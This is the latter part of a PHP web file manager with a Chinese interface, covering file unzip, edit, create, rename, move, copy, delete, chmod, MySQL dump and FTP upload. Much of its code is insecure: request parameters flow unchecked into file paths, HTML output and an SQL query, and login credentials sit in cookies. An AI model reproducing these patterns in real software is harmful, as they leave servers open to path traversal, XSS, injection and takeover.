function unzip($dename,$ndir,$del) {
    global $meurl, $folder;
    $nndir = $ndir;
    $nfolder = $folder;
    $ndename = $dename;
    $dename = gCode($dename);
    $folder = gCode($folder);
    $ndir = gCode($ndir);
    if (!$dename == "") {
        if (!file_exists($ndir)){
    	    mkdir($ndir, 0755);
        }
        if(class_exists('ZipArchive')){
            $zip = new ZipArchive();
            if ($zip->open($folder.$dename) === TRUE) {
            	maintop("解压");
                if($zip->extractTo($ndir)){
                echo '<div class="box">现在您可以 <a href="'.$meurl.'?op=home&folder='.$_SESSION["folder"].'">返回目录</a></div>';
                echo '<textarea rows=15 disabled>';
                for($i = 0; $i < $zip->numFiles; $i++) {
                    echo uCode($zip->getNameIndex($i))."\n";
                }
                $zip->close();
                echo $dename." 已经解压完成 $nndir\n";
            }else{
            	echo('无法解压文件：'.$nfolder.$ndename);
            }
                if($del=='del'){
                	if(unlink($folder.$dename)){
                		echo $ndename." 已经被删除\n";
                	}else{
                		echo $ndename." 删除失败！\n";
                	}
                }
                echo "</textarea>\n";
                mainbottom();
            }else{
                printerror('无法解压文件：'.$nfolder.$ndename);
            }
        }else{
        	printerror('此服务器上的PHP不支持ZipArchive，无法解压文件！');
        }
    }else{
        home();
    }
}


/****************************************************************/
/* function delete()                                            */
/*                                                              */
/* Second step in delete.                                       */
/* Deletes the actual file from disk.                           */
/* Recieves $upfile from up() as the uploaded file.             */
/****************************************************************/

function deltree($pathdir)  
{  
if(is_empty_dir($pathdir))//如果是空的  
    {  
    rmdir($pathdir);//直接删除  
    }  
    else  
    {//否则读这个目录，除了.和..外  
        $d=dir($pathdir);  
        while($a=$d->read())  
        {  
        if(is_file($pathdir.'/'.$a) && ($a!='.') && ($a!='..')){unlink($pathdir.'/'.$a);}  
        //如果是文件就直接删除  
        if(is_dir($pathdir.'/'.$a) && ($a!='.') && ($a!='..'))  
        {//如果是目录  
            if(!is_empty_dir($pathdir.'/'.$a))//是否为空  
            {//如果不是，调用自身，不过是原来的路径+他下级的目录名  
            deltree($pathdir.'/'.$a);  
            }  
            if(is_empty_dir($pathdir.'/'.$a))  
            {//如果是空就直接删除  
            rmdir($pathdir.'/'.$a);
            }
        }  
        }  
        $d->close();  
    }  
}  

function is_empty_dir($pathdir){
    $d=opendir($pathdir);  
    $i=0;  
    while($a=readdir($d)){  
        $i++;  
    }  
    closedir($d);  
    if($i>2){return false;}  
    else return true;  
}


/****************************************************************/
/* function edit()                                              */
/*                                                              */
/* First step in edit.                                          */
/* Reads the file from disk and displays it to be edited.       */
/* Recieves $upfile from up() as the uploaded file.             */
/****************************************************************/

function edit($fename) {
    global $meurl,$folder;
    $file = gCode($folder.$fename);
    if (file_exists($file)) {
        maintop("编辑");
        $contents = file_get_contents($file);
        if(function_exists('mb_detect_encoding'))$encode = mb_detect_encoding($contents,array('ASCII','UTF-8','GBK','GB2312'));else $encode = 'UTF-8';
        if(htmlspecialchars($_REQUEST['encode'])){$encode = htmlspecialchars($_REQUEST['encode']);}
        if($encode!="UTF-8" && !empty($encode))$contents = mb_convert_encoding($contents,"UTF-8",$encode);
        foreach(mb_list_encodings() as $key => $value){
          if($key >= 19):
            $arr=array('EUC-CN' => 'GB2312','CP936' => 'GBK','SJIS-mac'=>'MacJapanese','SJIS-Mobile#DOCOMO'=>'SJIS-DOCOMO','SJIS-Mobile#KDDI'=>'SJIS-KDDI','SJIS-Mobile#SOFTBANK'=>'SJIS-SOFTBANK','UTF-8-Mobile#DOCOMO'=>'UTF-8-DOCOMO','UTF-8-Mobile#KDDI-B'=>'UTF-8-KDDI','UTF-8-Mobile#SOFTBANK'=>'UTF-8-SOFTBANK','ISO-2022-JP-MOBILE#KDDI'=>'ISO-2022-JP-KDDI');
            if(array_key_exists($value, $arr)) $value_text = $arr[$value]; else $value_text = $value;
          if($encode == $value) $list.="<option value='$value' selected>".$value_text.'</option>'; else $list.="<option value='$value'>".$value_text.'</option>';
          endif;
        }
        echo "<form action='{$meurl}?op=save' method='post'><div class='title'>编辑文件 {$folder}{$fename}\n"
            ."<span class='right'><select onchange=\"javascript:window.location.href=('{$meurl}?op=edit&fename=$fename&folder=$folder&encode='+this.value);\" style=\"width:70px;height:20px;padding:0;margin:0;margin-top:-2px;font-size:12px;\">"
            ."<option disabled>当前文件编码</option>".$list
            .'</select> » '
            ."<select name=\"encode\" style=\"width:70px;height:20px;padding:0;margin:0;margin-top:-2px;font-size:12px;\">"
            ."<option disabled>保存文件编码</option>".$list
            .'</select></span></div>'
            ."<textarea rows='24' name='ncontent'>"
            .htmlspecialchars($contents)
            ."</textarea>"
            ."<br>\n"
            ."<input type='hidden' name='folder' value='{$folder}'>\n"
            ."<input type='hidden' name='fename' value='{$fename}'>\n"
            ."<input type='submit' value='保存' class='right button mob'>\n"
            ."</form>\n";
        mainbottom();
    }else{
        printerror("文件不存在！");
    }
}


/****************************************************************/
/* function save()                                              */
/*                                                              */
/* Second step in edit.                                         */
/* Recieves $ncontent from edit() as the file content.          */
/* Recieves $fename from edit() as the file name to modify.     */
/****************************************************************/

function save($ncontent, $fename, $encode) {
    global $meurl,$folder;
    if (!$fename == "") {
    $file = gCode($folder.$fename);
    $ydata = $ncontent;
    if($encode!=="UTF-8" && $encode!=="ASCII")$ydata = mb_convert_encoding($ydata,$encode,"UTF-8");
    if(file_put_contents($file, $ydata) or $ncontent=="") {
        maintop("编辑");
        echo "<div class='title'>文件 <a href='{$folder}{$fename}' target='_blank'>{$folder}{$fename}</a> 保存成功！<span class='right'>$encode</span></div>\n";
        echo "<div class='box'>请选择 <a href='{$meurl}?op=home&folder={$_SESSION['folder']}'>返回目录</a> 或者 <a href='{$meurl}?op=edit&fename={$fename}&folder={$folder}'>继续编辑</a></div>\n";
        $fp = null;
        mainbottom();
    }else{
        printerror("文件保存出错！");
    }
    }else{
    home();
    }
}

/****************************************************************/
/* function cr()                                                */
/*                                                              */
/* First step in create.                                        */
/* Promts the user to a filename and file/directory switch.     */
/****************************************************************/

function cr() {
    global $meurl, $folder;
    maintop("创建");
    echo "<form action='{$meurl}?op=create' method='post'>\n"
        ."<div class='title'>创建文件 或 目录 <span class='right'><select name='isfolder' style='width:100px;height:20px;padding:0;margin:0;margin-top:-2px;font-size:12px;'><option value='0'>文件 File</option>\n"
        ."<option value='1'>文件夹 Dir</option></select></span></div><div class='box' style='border-bottom:none'><label for='nfname'>文件名：</label><input type='text' size='20' id='nfname' placeholder='请输入文件名……' name='nfname' class='text long'>\n"
        ."</div><input type='text' class='text' id='ndir' style='width:calc(100% - 12px);margin:0;' name='ndir' placeholder='目标目录……' value='".$_SESSION['folder']."'>";

    echo "<input type='hidden' name='folder' value='$folder'>\n"
        ."<input type='submit' value='创建' class='right button mob'>\n"
        ."</form>\n";
    mainbottom();
}


/****************************************************************/
/* function create()                                            */
/*                                                              */
/* Second step in create.                                       */
/* Creates the file/directoy on disk.                           */
/* Recieves $nfname from cr() as the filename.                  */
/* Recieves $infolder from cr() to determine file trpe.         */
/****************************************************************/

function create($nfname, $isfolder, $ndir) {
    global $meurl, $folder;
    if (!$nfname == "") {
        $ndir = gCode($ndir);
        $nfname = gCode($nfname);
    if ($isfolder == 1) {
        if(mkdir($ndir."/".$nfname, 0755)) {
        	$ndir = uCode($ndir);
        	$nfname = uCode($nfname);
          maintop("创建");
            echo "<div class='title'>您的目录<a href='{$meurl}?op=home&folder=./".$nfname."/'>".$ndir.$nfname."/</a> 已经成功被创建。</div><div class='box'>\n"
            ."请选择 <a href='{$meurl}?op=home&folder=".$ndir.$nfname."/'>打开文件夹</a> 或者 <a href='{$meurl}?op=home&folder=".$_SESSION['folder']."'>返回目录</a>\n";
          echo "</div>";
          mainbottom();
        }else{
        	$ndir = uCode($ndir);
        	$nfname = uCode($nfname);
            printerror("您的目录 ".$ndir.$nfname." 不能被创建。请检查您的目录权限是否已经被设置为可写 或者 目录是否已经存在</span>\n");
        }
    }else{
        if(fopen($ndir."/".$nfname, "w")) {
        	$ndir = uCode($ndir);
        	$nfname = uCode($nfname);
          maintop("创建");
            echo "<div class='title'>您的文件, <a href='{$meurl}?op=viewframe&file=".$nfname."&folder=$ndir'>".$ndir.$nfname."</a> 已经成功被创建</div><div class='box'>\n"
                ."<a href='{$meurl}?op=edit&fename=".$nfname."&folder=".$ndir."'>编辑文件</a> 或者是 <a href='{$meurl}?op=home&folder=".$_SESSION['folder']."'>返回目录</a>\n";
          echo "</div>";
          mainbottom();
        }else{
        	$ndir = uCode($ndir);
        	$nfname = uCode($nfname);
            printerror("您的文件 ".$ndir.$nfname." 不能被创建。请检查您的目录权限是否已经被设置为可写 或者 文件是否已经存在</span>\n");
        }
    }
    }else{
    cr();
    }
}


/****************************************************************/
/* function ren()                                               */
/*                                                              */
/* First step in rename.                                        */
/* Promts the user for new filename.                            */
/* Globals $file and $folder for filename.                      */
/****************************************************************/

function ren($file) {
    global $meurl,$folder,$ufolder;
    $ufile = $file;
    if (!$file == "") {
        maintop("重命名");
        echo "<form action='{$meurl}?op=rename' method='post'>\n"
            ."<div class='title'>重命名 ".$ufolder.$ufile.'</div>';
        echo "<input type='hidden' name='rename' value='".$ufile."'>\n"
            ."<input type='hidden' name='folder' value='".$ufolder."'>\n"
            ."<input class='text' type='text' style='width:calc(100% - 12px);margin:0;' placeholder='请输入文件名……' name='nrename' value='$ufile'>\n"
            ."<input type='Submit' value='重命名' class='right button mob'></form>\n";
        mainbottom();
    }else{
        home();
    }
}


/****************************************************************/
/* function renam()                                             */
/*                                                              */
/* Second step in rename.                                       */
/* Rename the specified file.                                   */
/* Recieves $rename from ren() as the old  filename.            */
/* Recieves $nrename from ren() as the new filename.            */
/****************************************************************/

function renam($rename, $nrename, $folder) {
    global $meurl,$folder;
    if (!$rename == "") {
        $loc1 = gCode("$folder".$rename); 
        $loc2 = gCode("$folder".$nrename);
        if(rename($loc1,$loc2)) {
        	maintop("重命名");
            echo "<div class='title'>文件 ".$folder.$rename." 已被重命名成 ".$folder.$nrename."</a></div>\n"
            ."<div class='box'>请选择 <a href='{$meurl}?op=home&folder=".$_SESSION['folder']."'>返回目录</a> 或者 <a href='?op=edit&fename={$nrename}&folder={$folder}'>编辑新文件</a></div>\n";
            mainbottom();
        }else{
            printerror("重命名出错！");
        }
    }else{
    home();
    }
}

/****************************************************************/
/* function movall                                              */
/*                                                              */
/* 批量移动 2014-4-12 by jooies                                 */
/****************************************************************/

function movall($file, $ndir, $folder) {
    global $meurl,$folder;
    if (!$file == "") {
        maintop("批量移动");
        $arr = str_split($ndir);
        if($arr[count($arr)-1]!=='/'){
            $ndir .= '/';
        }
        $nndir = $ndir;
        $nfolder = $folder;
    	$file = gCode($file);
    	$ndir = gCode($ndir);
    	$folder = gCode($folder);
        if (!file_exists($ndir)){
    	    mkdir($ndir, 0755);
        }
        $file = explode(',',$file);
      echo "<div class='title'>您可以 <a href='{$meurl}?op=home&folder={$nndir}'>前往文件夹查看文件</a> 或者 <a href='{$meurl}?op=home&folder=".$_SESSION['folder']."'>返回目录</a></div><textarea rows=20 disabled>";
        foreach ($file as $v) {
        if (file_exists($ndir.$v)){
        	if (rename($folder.$v, $ndir.$v."(1)")){
        		$v = uCode($v);
    	       echo $nndir.$v." 文件已存在，自动更名为 {$nndir}(1)\n";
            }else{
            	$v = uCode($v);
              echo "无法移动 ".$nfolder.$v."，请检查文件权限\n";
            }
        }elseif (rename($folder.$v, $ndir.$v)){
        	$v = uCode($v);
            echo $nfolder.$v." 已经成功移动到 ".$nndir.$v."\n";
        }else{
        	$v = uCode($v);
            echo "无法移动 ".$nfolder.$v."，请检查文件权限或文件是否存在\n";
        }
        }
    echo "</textarea>";
    mainbottom();
    }else{
    home();
    }
}

/****************************************************************/
/* function tocopy                                              */
/*                                                              */
/* 批量复制 2014-4-19 by jooies                                 */
/****************************************************************/

function tocopy($file, $ndir, $folder) {
    global $meurl,$folder;
    if (!$file == "") {
        maintop("复制");
        $nndir = $ndir;
        $nfolder = $folder;
    	  $file = gCode($file);
    	  $ndir = gCode($ndir);
    	  $folder = gCode($folder);
        if (!file_exists($ndir)){
    	    mkdir($ndir, 0755);
        }
        $file = explode(',',$file);
        echo "<div class='box'>您可以 <a href='{$meurl}?op=home&folder=".$nndir."'>前往文件夹查看文件</a> 或者 <a href='{$meurl}?op=home&folder=".$_SESSION['folder']."'>返回目录</a></div><textarea rows=20 disabled>";
        foreach ($file as $v) {
        if (file_exists($ndir.$v)){
        	if (copy($folder.$v, $ndir.$v.'(1)')){
        		  $v = iconv("GBK", "UTF-8",$v);
    	        echo "{$nndir}{$v} 文件已存在，自动更名为 {$nfolder}{$v}(1)\n";
            }else{
            	$v = iconv("GBK", "UTF-8",$v);
              echo "无法复制 {$nfolder}{$v}，请检查文件权限\n";
            }
        }elseif (copy($folder.$v, $ndir.$v)){
        	$v = iconv("GBK", "UTF-8",$v);
            echo $nfolder.$v." 已经成功复制到 ".$nndir.$v."\n";
        }else{
        	$v = iconv("GBK", "UTF-8",$v);
            echo "无法复制 ".$nfolder.$v."，请检查文件权限\n";
        }
        }
    echo "</textarea>";
    mainbottom();
    }else{
    home();
    }
}


/****************************************************************/
/* function logout()                                            */
/*                                                              */
/* Logs the user out and kills cookies                          */
/****************************************************************/

function logout() {
    global $meurl;
    setcookie("user","",time()-60*60*24*1);
    setcookie("pass","",time()-60*60*24*1);

    maintop("注销",false);
    echo "<div class='box'>注销成功！<br>"
        ."<a href={$meurl}?op=home>点击这里重新登录</a></dvi>";
    mainbottom();
}


/****************************************************************/
/* function mainbottom()                                        */
/*                                                              */
/* 页面底部的版权声明                                           */
/****************************************************************/

function mainbottom() {
    echo "</div><div style='text-align:center;font-size:13px;color:#999 !important;margin:10px 0 45px 0;font-family:Candara;'>"
        ."文件服务系统 Version 1.10.0.2</div></body>\n"
        ."</html>\n";
    exit;
}


/****************************************************************/
/* function sqlb()                                              */
/*                                                              */
/* First step to backup sql.                                    */
/****************************************************************/

function sqlb() {
	global $meurl;
    maintop("数据库备份");
    echo "<div class='title'><span>这将进行数据库导出并压缩成mysql.zip的动作! 如存在该文件,该文件将被覆盖！</span></div><div class='box'><form action='{$meurl}?op=sqlbackup' method='POST'>\n<label for='ip'>数据库地址:  </label><input type='text' id='ip' name='ip' size='30' value='localhost' class='text'/><br><label for='sql'>数据库名称:  </label><input type='text' id='sql' name='sql' size='30' class='text'/><br><label for='username'>数据库用户:  </label><input type='text' id='username' name='username' size='30' value='root' class='text'/><br><label for='password'>数据库密码:  </label><input type='password' id='password' name='password' size='30' class='text'/><br></div><input name='submit' class='right button mob' value='备份' type='submit' /></form>\n";
    mainbottom();
}


/****************************************************************/
/* function sqlbackup()                                         */
/*                                                              */
/* Second step in backup sql.                                   */
/****************************************************************/

function sqlbackup($ip="localhost",$sql,$username="root",$password) {
	global $meurl;
    if(class_exists('ZipArchive')){
    $database=$sql;//数据库名
    $options=array(
        'hostname' => $ip,//ip地址
        'charset' => 'utf8',//编码
        'filename' => $database.'.sql',//文件名
        'username' => $username,
        'password' => $password
    );
    $mysql = mysqli_connect($options['hostname'],$options['username'],$options['password'],$database)or die(printerror("不能连接数据库：".mysqli_connect_error()));
    maintop("MySQL备份");
    mysqli_query($mysql,"SET NAMES '{$options['charset']}'");
    $tables = list_tables($database,$mysql);
    $filename = sprintf($options['filename'],$database);
    $fp = fopen($filename, 'w');
    foreach ($tables as $table) {
        dump_table($table, $fp,$mysql);
    }
    fclose($fp);
    mysqli_close($mysql);
    //压缩sql文件
        if (file_exists('mysql.zip')) {
            unlink('mysql.zip'); 
        }
        $file_name=$options['filename'];
        $zip = new ZipArchive;
        $res = $zip->open('mysql.zip', ZipArchive::CREATE);
        if ($res === TRUE) {
            $zip->addfile($file_name);
            $zip->close();
        //删除服务器上的sql文件
            unlink($file_name);
        echo '<div class="box">数据库导出并压缩完成！'
            ." <a href='{$meurl}?op=home&folder=".$_SESSION['folder']."'>返回目录</a></div>\n";
        }else{
            printerror('无法压缩文件！');
        }
    exit;
    mainbottom();
    }else{
    	printerror('此服务器上的PHP不支持ZipArchive，无法压缩文件！');
    }
}

function list_tables($database,$mysql)
{
    $rs = mysqli_query($mysql,"SHOW TABLES FROM $database");
    $tables = array();
    while ($row = mysqli_fetch_row($rs)) {
        $tables[] = $row[0];
    }
    mysqli_free_result($rs);
    return $tables;
}

//导出数据库
function dump_table($table, $fp = null,$mysql)
{
    $need_close = false;
    if (is_null($fp)) {
        $fp = fopen($table . '.sql', 'w');
        $need_close = true;
    }
$a=mysqli_query($mysql,"show create table `{$table}`");
$row=mysqli_fetch_assoc($a);fwrite($fp,$row['Create Table'].';');//导出表结构
    $rs = mysqli_query($mysql,"SELECT * FROM `{$table}`");
    while ($row = mysqli_fetch_row($rs)) {
        fwrite($fp, get_insert_sql($table, $row));
    }
    mysqli_free_result($rs);
    if ($need_close) {
        fclose($fp);
    }
}

//导出表数据
function get_insert_sql($table, $row)
{
    $sql = "INSERT INTO `{$table}` VALUES (";
    $values = array();
    foreach ($row as $value) {
        $values[] = "'" . mysql_real_escape_string($value) . "'";
    }
    $sql .= implode(', ', $values) . ");";
    return $sql;
}

/****************************************************************/
/* function ftpa()                                              */
/*                                                              */
/* First step to backup sql.                                    */
/****************************************************************/

function ftpa() {
	global $meurl;
    maintop("FTP备份");
    echo "<div class='title'>这将把文件远程上传到其他ftp！如目录存在该文件,文件将被覆盖！</div>\n<form action='{$meurl}?op=ftpall' method='POST'><div class='box'><label for='ftpip'>FTP 地址：</label><input type='text' id='ftpip' name='ftpip' size='30' class='text' value='127.0.0.1:21'/><br><label for='ftpuser'>FTP 用户：</label><input type='text' id='ftpuser' name='ftpuser' size='30' class='text'/><br><label for='ftppass'>FTP 密码：</label><input type='password' id='ftppass' name='ftppass' size='30' class='text'/><br><label type='text' for='goto'>上传目录：</label><input type='text' id='goto' name='goto' size='30' class='text' value='./htdocs/'/><br><label for='ftpfile'>上传文件：</label><input type='text' id='ftpfile' name='ftpfile' size='30' class='text' value='allbackup.zip'/></div><div class='right'><label for='del'><input type='checkbox' name='del' id='del'value='checkbox'><abbr title='FTP上传后删除本地文件'>删除</abbr></label> <input name='submit' class='button' value='远程上传' type='submit' /></div></form>\n";
    mainbottom();
}

/****************************************************************/
/* function ftpall()                                         */
/*                                                              */
/* Second step in backup sql.                                   */
/****************************************************************/

function ftpall($ftpip,$ftpuser,$ftppass,$ftpdir,$ftpfile,$del) {
	global $meurl;
	$ftpfile = gCode($ftpfile);
    $ftpip=explode(':', $ftpip);
    $ftp_server=$ftpip['0'];//服务器
    $ftp_user_name=$ftpuser;//用户名
    $ftp_user_pass=$ftppass;//密码
    if(empty($ftpip['1'])){
    	$ftp_port='21';
    }else{
    	$ftp_port=$ftpip['1'];//端口
    }
    $ftp_put_dir=$ftpdir;//上传目录
    $ffile=$ftpfile;//上传文件

    $ftp_conn_id = ftp_connect($ftp_server,$ftp_port);
    $ftp_login_result = ftp_login($ftp_conn_id, $ftp_user_name, $ftp_user_pass);

    if((!$ftp_conn_id) || (!$ftp_login_result)) {
        printerror('连接到ftp服务器失败');
        exit;
    }else{
        ftp_pasv ($ftp_conn_id,true); //返回一下模式，这句很奇怪，有些ftp服务器一定需要执行这句
        ftp_chdir($ftp_conn_id, $ftp_put_dir);
        $ffile=explode(',', $ffile);
        foreach ($ffile as $v) {
        	$ftp_upload = ftp_put($ftp_conn_id,$v,$v, FTP_BINARY);
        	if ($del == 'del') {
        		unlink('./'.$v);
        	}
        }
        ftp_close($ftp_conn_id); //断开
    }
    maintop("FTP上传");
    echo "<div class='title'>";
    $ftpfile = uCode($ftpfile);
    echo "文件 ".$ftpfile." 上传成功</div><div class='box'>\n"
        ." <a href='{$meurl}?op=home&folder=".$_SESSION['folder']."'>返回目录</a>\n";
    echo "</div>";
    mainbottom();
}


/****************************************************************/
/* function printerror()                                        */
/*                                                              */
/* 用于显示错误信息的函数                                       */
/* $error为显示的提示                                           */
/****************************************************************/

function printerror($error) {
    maintop("错误");
    echo "<div class='title'>错误信息如下：</div><div class='box'><span class='error' style='font-size:12px;'>\n".$error."\n</span> <a onclick='history.go(-1);' style='cursor:pointer;font-size:12px;'>返回上一步</a></div>";
    mainbottom();
}

/****************************************************************/
/* function deleteall()                                         */
/*                                                              */
/* 2014-3-9 Add by Jooies                                       */
/* 实现文件的批量删除功能                                       */
/****************************************************************/

function deleteall($dename) {
    if (!$dename == "") {
    	$udename = $dename;
    	$dename = gCode($dename);
        if (is_dir($dename)) {
            if(is_empty_dir($dename)){ 
                rmdir($dename);
                echo $udename." 已经被删除\n";
            }else{
                deltree($dename);
                rmdir($dename);
                echo $udename." 已经被删除\n";
            }
        }else{
            if(unlink($dename)) {
                echo $udename." 已经被删除\n";
            }else{
                echo("无法删除文件：$udename 。\n参考信息\n1.文件不存在\n2.文件正在执行\n");
            }
        }
    }
}

switch($action) {//$action 为批量操作
    case "删除":
    if(isset($_POST['select_item'])){
      maintop("删除");
      echo "<div class='box'>您可以 <a href='{$meurl}?op=home&folder=".$_SESSION['folder']."'>返回目录</a></div>\n";
      echo '<textarea rows=15 disabled>';
        if($_POST['select_item']['d']){
            foreach($_POST['select_item']['d'] as $val){
                deleteall($val);
            }
        }
        if($_POST['select_item']['f']){
            foreach($_POST['select_item']['f'] as $val){
                if(deleteall($val)){}
            }
        }
        echo '</textarea>';
        mainbottom();
    }else{
        printerror("您没有选择文件");
    }
    break;

    case "移动":
    if(isset($_POST['select_item'])){
        maintop("批量移动");
        $file = '';
        if($_POST['select_item']['d']){
            foreach($_POST['select_item']['d'] as $key => $val){
                $file = $file.$key.',';
            }
        }
        if($_POST['select_item']['f']){
            foreach($_POST['select_item']['f'] as $key => $val){
                $file = $file.$key.',';
            }
        }
        $file = substr($file,0,-1);
        echo "<form action='{$meurl}?op=movall' method='post'>";
        echo '<div class="title">移动文件</div><div class="box"><input type="hidden" name="file" value="'.$file.'"><input type="hidden" name="folder" value="'.$_SESSION['folder'].'">您将把下列文件移动到：'
            ."<input type='text' class='text' name='ndir' value='".$_SESSION['folder']."'>\n"
            ."</div><textarea rows=15 disabled>".$file."</textarea>";
        echo "<input type='submit' value='移动' border='0' class='right button mob'>\n";
        mainbottom();
    }else{
        printerror("您没有选择文件");
    }
    break;

    case "复制":
    if(isset($_POST['select_item'])){
        maintop("复制");
        $file = '';
        if($_POST['select_item']['d']){
            foreach($_POST['select_item']['d'] as $key => $val){
                $file = $file.$key.',';
            }
        }
        if($_POST['select_item']['f']){
            foreach($_POST['select_item']['f'] as $key => $val){
                $file = $file.$key.',';
            }
        }
        $file = substr($file,0,-1);
        echo "<form action='{$meurl}?op=copy' method='post'>";
        echo '<div class="title">复制文件</div><div class="box"><input type="hidden" name="file" value="'.$file.'"><input type="hidden" name="folder" value="'.$_SESSION['folder'].'">您将把下列文件复制到：'
            ."<input type='text' class='text' name='ndir' value='".$_SESSION['folder']."'>\n"
            ."</div><textarea rows=15 disabled>".$file."</textarea>";
        echo "<input type='submit' value='复制' border='0' class='right button mob'>\n";
        mainbottom();
    }else{
        printerror("您没有选择文件");
    }
    break;

    case "压缩":
    if(isset($_POST['select_item'])){
    if(class_exists('ZipArchive')){
        maintop("目录压缩");
        $time = $_SERVER['REQUEST_TIME'];
        echo "<div class='box'>您可以 <a href='{$meurl}?op=home&folder=".$_SESSION['folder']."'>查看文件夹</a> 或者 <a href='./Backup-{$time}.zip'>下载文件</a> 或者 <a href='{$meurl}?op=home'>返回目录</a></div>";
        echo '<textarea rows=15 disabled>';
        class Zipper extends ZipArchive {
            public function addDir($path) {
                if($_POST['select_item']['d']){
                    foreach($_POST['select_item']['d'] as $key => $val){
                        $val = substr($val,2);
                        $val = gCode($val);
                        $this->addDir2($val);
                    }
                }
                if($_POST['select_item']['f']){
                    foreach($_POST['select_item']['f'] as $key => $val){
                        $val = substr($val,2);
                        echo $val."\n";
                        $this->addFile($val);
                    }
                    $this->deleteName('./');
                }
            }
            public function addDir2($path) {
                $nval = iconv("GBK", "UTF-8",$path);
                echo $nval."\n";
                $this->addEmptyDir($path);
                $dr = opendir($path);
                $i=0;
                while (($file = readdir($dr)) !== false)
                {
                    if($file!=='.' && $file!=='..'){
                        $nodes[$i] = $path.'/'.$file;
                        $i++;
                    }
                }
                closedir($dr);
                foreach ($nodes as $node) {
                    $nnode = iconv("GBK", "UTF-8",$node);
                    echo $nnode . "\n";
                    if (is_dir($node)) {
                        $this->addDir2($node);
                    }elseif(is_file($node)){
                        $this->addFile($node);
                    }
                }
            }
        }
        $zip = new Zipper;
        $res = $zip->open($_SESSION['folder'].'Backup-'.$time.'.zip', ZipArchive::CREATE);
        if ($res === TRUE) {
            $f = substr($_SESSION['folder'], 0, -1);
            $zip->addDir($f);
            $zip->close();
            echo "压缩完成，文件保存为Backup-".$time.".zip</textarea>\n";
        }else{
            echo '<span class="error">压缩失败！</span>'
                ."</textarea>\n";
        }
        mainbottom();
    }else{
        printerror('此服务器上的PHP不支持ZipArchive，无法压缩文件！');
    }
    }else{
        printerror("您没有选择文件");
    }
    break;

    case "权限":
    if($os != 'windows'){
    if(isset($_POST['select_item'])){
        maintop("修改权限");
        echo "<div class='title'><a href='{$meurl}?op=home&folder=".$_SESSION['folder']."'>返回目录</a></div>\n";
        echo '<textarea rows=20 disabled>';
        $chmod = octdec(htmlentities($_REQUEST['chmod']));
        function ChmodMine($file, $chmod)
        {
            $nfile = $file;
            $file = gCode($file);
            if(is_file($file)){
                if(chmod($file, $chmod)){
                    echo '文件'.$nfile." 权限修改成功\n";
                }else{
                    echo '文件'.$nfile." 权限修改失败\n";
                }
            }elseif(is_dir($file)){
                if(chmod($file, $chmod)){
                    echo '文件夹'.$nfile." 权限修改成功\n";
                }else{
                    echo '<span class="error">文件夹'.$nfile." 权限修改失败\n";
                }
                $foldersAndFiles = scandir($file);
                $entries = array_slice($foldersAndFiles, 2);
                foreach($entries as $entry){
                    $nentry = iconv("GBK", "UTF-8",$entry);
                    ChmodMine($nfile.'/'.$nentry, $chmod);
                }
            }else{
                echo $nfile." 文件不存在！\n";
            }
        }
        if($_POST['select_item']['d']){
            foreach($_POST['select_item']['d'] as $val){
                ChmodMine($val,$chmod);
            }
        }
        if($_POST['select_item']['f']){
            foreach($_POST['select_item']['f'] as $val){
                ChmodMine($val,$chmod);
            }
        }
        echo "</textarea>";
        mainbottom();
    }else{
        printerror("您没有选择文件");
    }
    }else{printerror("Windows系统无法修改权限。");}
    break;

}

/****************************************************************/
/* function switch()                                            */
/*                                                              */
/* Switches functions.                                          */
/* Recieves $op() and switches to it                            *.
/****************************************************************/

switch($op) {
    case "home":
    home();
    break;

    case "up":
    up();
    break;

    case "yupload":
    if(!isset($_REQUEST['url'])){
    	printerror('您没有输入文件地址！');
    }elseif(isset($_REQUEST['ndir'])){
        yupload($_REQUEST['url'], $_REQUEST['ndir'], $_REQUEST['unzip'],$_REQUEST['delzip']);
    }else{
    	yupload($_REQUEST['url'], './',$_REQUEST['unzip'],$_REQUEST['delzip']);
    }
    break;

    case "upload":
    if(!isset($_FILES['upfile'])){
    	printerror('您没有选择文件！');
    }elseif(isset($_REQUEST['ndir'])){
        upload($_FILES['upfile'], $_REQUEST['ndir'], $_REQUEST['unzip'] ,$_REQUEST['delzip']);
    }else{
    	upload($_FILES['upfile'], './', $_REQUEST['unzip'] ,$_REQUEST['delzip']);
    }
    break;

    case "unz":
    unz($_REQUEST['dename']);
    break;

    case "unzip":
    unzip($_REQUEST['dename'],$_REQUEST['ndir'],$_REQUEST['del']);
    break;

    case "sqlb":
    sqlb();
    break;

    case "sqlbackup":
    sqlbackup($_POST['ip'], $_POST['sql'], $_POST['username'], $_POST['password']);
    break;

    case "ftpa":
    ftpa();
    break;

    case "ftpall":
    ftpall($_POST['ftpip'], $_POST['ftpuser'], $_POST['ftppass'], $_POST['goto'], $_POST['ftpfile'], $_POST['del']);
    break;

    case "edit":
    edit($_REQUEST['fename']);
    break;

    case "save":
    save($_REQUEST['ncontent'], $_REQUEST['fename'], $_REQUEST['encode']);
    break;

    case "cr":
    cr();
    break;

    case "create":
    create($_REQUEST['nfname'], $_REQUEST['isfolder'], $_REQUEST['ndir']);
    break;

    case "ren":
    ren($_REQUEST['file']);
    break;

    case "rename":
    renam($_REQUEST['rename'], $_REQUEST['nrename'], $folder);
    break;

    case "movall":
    movall($_REQUEST['file'], $_REQUEST['ndir'], $folder);
    break;

    case "copy":
    tocopy($_REQUEST['file'], $_REQUEST['ndir'], $folder);
    break;

    case "printerror":
    printerror($error);
    break;

    case "logout":
    logout();
    break;   

    case "z":
    z($_REQUEST['dename'],$_REQUEST['folder']);
    break;

    case "zip":
    zip($_REQUEST['dename'],$_REQUEST['folder']);
    break;

    default:
    home();
    break;
}

?>